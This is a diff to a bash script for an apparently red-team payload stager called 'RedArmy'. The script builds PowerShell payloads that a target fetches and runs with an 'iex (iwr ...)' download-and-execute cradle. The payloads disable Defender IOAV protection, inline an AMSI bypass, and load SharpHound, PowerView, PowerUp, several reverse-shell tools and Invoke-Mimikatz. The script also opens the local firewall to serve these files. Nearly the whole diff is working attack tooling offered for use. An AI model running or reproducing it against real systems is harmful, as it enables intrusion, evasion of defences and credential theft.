@@ -88,99 +88,125 @@ if [[ -n $(command -v git) ]] && [[ -n $update ]]; then
 fi
 
 # Save some variables for convenience
-dllname="Microsoft.ActiveDirectory.Management.dll"
-dll="C:\\Windows\\Temp\\$dllname"
+admodule_dll="ADModule/Microsoft.ActiveDirectory.Management.dll"
+cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
 hide="-ErrorAction SilentlyContinue -WarningAction SilentlyContinue"
-iex="iex $hide"
-iwr="iwr $hide -UseBasicParsing"
 languagemode="\$ExecutionContext.SessionState.LanguageMode"
+red="\$([char]27)[41m"
+reset="\$([char]27)[0m"
 
 # Setup invade.ps1
 cat >invade.ps1 <<EOF
+if (!($languagemode -match "constrained")) {
+    # Load RedArmy
+    iex (iwr -DisableKeepAlive -UseBasicParsing $url/wave2.ps1)
+} else {
+    # Do nothing
+    echo "You're in a constrained shell"
+}
+EOF
+
+cat >wave2.ps1 <<EOF
+\$isAdmin = (
+    New-Object Security.Principal.WindowsPrincipal(
+        [Security.Principal.WindowsIdentity]::GetCurrent()
+    )
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# Change prompt colors so user knows RedArmy is loaded in current
+# session
+function prompt {
+    "${red}PS \$($cwd)\$(">" * (\$NestedPromptLevel + 1))$reset "
+}
+
 # ADModule
-$iwr -OutFile $dll $url/ADModule/$dllname
-if (!\$?) {echo "Failed to fetch ADModule"}
-Import-Module $hide $dll
+Import-Module -Assembly (
+    [System.Reflection.Assembly]::Load(
+        [System.Convert]::FromBase64String(
+            "$(base64 -w 0 $admodule_dll)"
+        )
+    )
+) $hide
 if (\$?) {
     echo "Imported ADModule"
 } else {
     echo "Failed to import ADModule"
 }
 
-if (!($languagemode -match "constrained")) {
-    # Disable defender
-    Set-MpPreference $hide -DisableIOAVProtection \$true
+# Disable defender if elevated
+if (\$isAdmin) {
+    Set-MpPreference -DisableIOAVProtection \$true $hide
     if (\$?) {
         echo "Disabled IOAVProtection"
     } else {
-        echo "Failed to disable IOAVProtection, elevated shell?"
-    }
-
-    # AMSI bypass
-    $iex ($iwr $url/amsi_bypass.ps1)
-    if (\$?) {
-        echo "Bypassed AMSI"
-    } else {
-        echo "Failed to bypass AMSI"
-    }
-
-    # BloodHound
-    $iex ($iwr $url/BloodHound/Ingestors/SharpHound.ps1)
-    if (\$?) {
-        echo "Imported BloodHound"
-    } else {
-        echo "Failed to import BloodHound"
-    }
-
-    # PowerView and PowerUp
-    $iex ($iwr $url/PowerSploit/Recon/PowerView.ps1)
-    if (\$?) {
-        echo "Imported PowerView"
-    } else {
-        echo "Failed to import PowerView"
-    }
-    $iex ($iwr $url/PowerSploit/Privesc/PowerUp.ps1)
-    if (\$?) {
-        echo "Imported PowerUp"
-    } else {
-        echo "Failed to import PowerUp"
-    }
-
-    # Reverse shell goodies
-    $iex ($iwr $url/ConPtyShell/Invoke-ConPtyShell.ps1)
-    if (\$?) {
-        echo "Imported ConPtyShell"
-    } else {
-        echo "Failed to import ConPtyShell"
-    }
-    $iex ($iwr $url/nishang/Shells/Invoke-PowerShellTcp.ps1)
-    if (\$?) {
-        echo "Imported PowerShellTcp"
-    } else {
-        echo "Failed to import PowerShellTcp"
-    }
-    $iex ($iwr $url/powercat/powercat.ps1)
-    if (\$?) {
-        echo "Imported PowerCat"
-    } else {
-        echo "Failed to import PowerCat"
-    }
-
-    # Mimikatz
-    $iex ($iwr $url/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
-    if (!\$?) {echo "Failed to import Mimikatz"}
-    if (\$?) {
-        echo "Imported Mimikatz"
-    } else {
-        echo "Failed to import Mimikatz"
+        echo "Failed to disable IOAVProtection"
     }
 } else {
-    echo "You're in a constrained shell"
+    echo "Run elevated to disable IOAVProtection"
+}
+
+# AMSI bypass
+$(cat amsi_bypass.ps1)
+if (\$?) {
+    echo "Bypassed AMSI"
+} else {
+    echo "Failed to bypass AMSI"
+}
+
+# BloodHound
+$(cat BloodHound/Ingestors/SharpHound.ps1)
+if (\$?) {
+    echo "Imported BloodHound"
+} else {
+    echo "Failed to import BloodHound"
+}
+
+# PowerView and PowerUp
+$(cat PowerSploit/Recon/PowerView.ps1)
+if (\$?) {
+    echo "Imported PowerView"
+} else {
+    echo "Failed to import PowerView"
+}
+$(cat PowerSploit/Privesc/PowerUp.ps1)
+if (\$?) {
+    echo "Imported PowerUp"
+} else {
+    echo "Failed to import PowerUp"
+}
+
+# Reverse shell goodies
+$(cat ConPtyShell/Invoke-ConPtyShell.ps1)
+if (\$?) {
+    echo "Imported ConPtyShell"
+} else {
+    echo "Failed to import ConPtyShell"
+}
+$(cat nishang/Shells/Invoke-PowerShellTcp.ps1)
+if (\$?) {
+    echo "Imported PowerShellTcp"
+} else {
+    echo "Failed to import PowerShellTcp"
+}
+$(cat powercat/powercat.ps1)
+if (\$?) {
+    echo "Imported PowerCat"
+} else {
+    echo "Failed to import PowerCat"
+}
+
+# Mimikatz
+$(cat PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
+if (\$?) {
+    echo "Imported Mimikatz"
+} else {
+    echo "Failed to import Mimikatz"
 }
 EOF
+sed -i -r -e "/^(\s*(#([^>].+)?)?)?$/d" -e "s/\s+$//g" wave2.ps1
 
 # Let user know what to type
-info "iex (iwr -UseBasicParsing $url/invade.ps1)"
+info "iex (iwr -DisableKeepAlive -UseBasicParsing $url/invade.ps1)"
 
 # Open firewall
 sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
@@ -194,4 +220,4 @@ sudo iptables -D INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
 sudo iptables -D INPUT -p udp -d "$ip" --dport "$port" -j ACCEPT
 
 # Cleanup
-rm -f invade.ps1
+rm -f invade.ps1 wave2.ps1
